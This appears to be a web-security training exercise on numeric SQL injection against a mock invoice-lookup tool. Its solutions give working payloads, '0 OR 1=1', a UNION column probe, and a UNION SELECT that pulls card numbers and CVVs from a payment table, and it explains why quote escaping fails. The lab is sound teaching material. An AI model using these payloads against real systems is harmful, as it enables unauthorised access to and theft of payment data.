Numeric Injection — No Quotes Needed

This internal finance tool builds its query from a numeric invoice ID with no surrounding quotes, because "it's just a number." A defense that only escapes quote characters does nothing here — there are none to escape.

INVOICE LOOKUP
CHALLENGES
01 — Bypass the ID check entirelyReturn every invoice without knowing a single valid ID.
02 — Find the column countPrepare for a UNION attack the same way you would with a string field.
03 — Pivot to payment dataThe payment_methods table isn't linked anywhere in this UI. Reach it anyway.
View solutions
01 — Always-true, no quotes A bare OR clause works just as well without string delimiters. 
Invoice ID: 0 OR 1=1
02 — Discover the column count Three columns are selected: invoice_no, amount, customer. 
Invoice ID: 0 UNION SELECT 1,2,3
03 — Leak stored card data Match the column count against a table nobody meant to expose. 
Invoice ID: 0 UNION SELECT card_number, cvv, owner FROM payment_methods

Stripping or escaping quote characters — a very common "fix" — would not have stopped any of this, because the payload never used one.
